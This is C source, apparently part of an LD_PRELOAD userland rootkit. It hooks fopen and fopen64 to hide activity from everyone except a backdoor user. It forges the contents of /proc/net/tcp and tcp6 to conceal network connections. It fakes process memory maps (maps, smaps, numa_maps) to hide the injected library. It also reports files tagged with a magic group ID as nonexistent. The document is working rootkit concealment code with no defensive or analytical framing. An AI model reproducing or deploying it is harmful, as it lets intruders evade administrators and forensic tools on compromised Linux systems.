FILE *fopen(const char *pathname, const char *mode)
{
    HOOK(o_fopen, CFOPEN);
    if(is_bdusr()) return o_fopen(pathname, mode);

    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
      return forge_procnet(pathname);

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }

    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return NULL; }
    return o_fopen(pathname, mode);
}

FILE *fopen64(const char *pathname, const char *mode)
{
    HOOK(o_fopen64, CFOPEN64);
    if(is_bdusr()) return o_fopen64(pathname, mode);
    
    if(!strcmp(pathname, "/proc/net/tcp") || !strcmp(pathname, "/proc/net/tcp6"))
      return forge_procnet(pathname);

    if(!fnmatch("/proc/*/maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
    if(!fnmatch("/proc/*/smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
    if(!fnmatch("/proc/*/numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);

    char cwd[PATH_MAX];
    if(getcwd(cwd, sizeof(cwd)) != NULL)
    {
        if(!strcmp(cwd, "/proc"))
        {
            if(!fnmatch("*/maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("*/smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("*/numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);
        }

        if(!fnmatch("/proc/*",cwd,FNM_PATHNAME))
        {
            if(!fnmatch("maps",pathname,FNM_PATHNAME)) return forge_maps(pathname);
            if(!fnmatch("smaps",pathname,FNM_PATHNAME)) return forge_smaps(pathname);
            if(!fnmatch("numa_maps",pathname,FNM_PATHNAME)) return forge_numamaps(pathname);
        }
    }
    
    if(hxstat(pathname,MGID,32)) { errno = ENOENT; return NULL; }
    return o_fopen64(pathname, mode);
}
